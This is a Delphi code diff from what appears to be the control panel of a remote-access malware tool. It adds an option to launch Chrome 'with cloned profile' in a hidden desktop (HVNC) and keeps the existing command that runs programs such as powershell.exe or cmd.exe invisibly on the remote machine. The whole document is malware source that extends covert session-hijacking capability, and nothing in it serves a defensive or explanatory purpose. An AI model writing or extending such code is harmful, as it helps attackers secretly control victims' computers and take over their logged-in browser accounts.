@@ -182,6 +182,7 @@ begin
   ComboBox2.Items.Add('powershell.exe');
   ComboBox2.Items.Add('cmd.exe');
   ComboBox2.Items.Add('explorer.exe');
+  ComboBox2.Items.Add('chrome.exe');
   ComboBox2.ItemIndex := 0;
 
   PaintBox1.ControlStyle := PaintBox1.ControlStyle + [csDoubleClicks, csOpaque];
@@ -539,10 +540,19 @@ begin
 
   JSONObj := TJSONObject.Create;
   try
-    JSONObj.AddPair('action', 'hvnc_run');
-    JSONObj.AddPair('path',   ComboBox2.Text);
+    if ComboBox2.Text = 'chrome.exe' then
+    begin
+      JSONObj.AddPair('action', 'hvnc_browser');
+      JSONObj.AddPair('browser', 'chrome.exe');
+      LogToStatus('Launching Chrome with cloned profile...');
+    end
+    else
+    begin
+      JSONObj.AddPair('action', 'hvnc_run');
+      JSONObj.AddPair('path',   ComboBox2.Text);
+      LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
+    end;
     FSendJSON(FLine, JSONObj);
-    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
   finally
     JSONObj.Free;
   end;
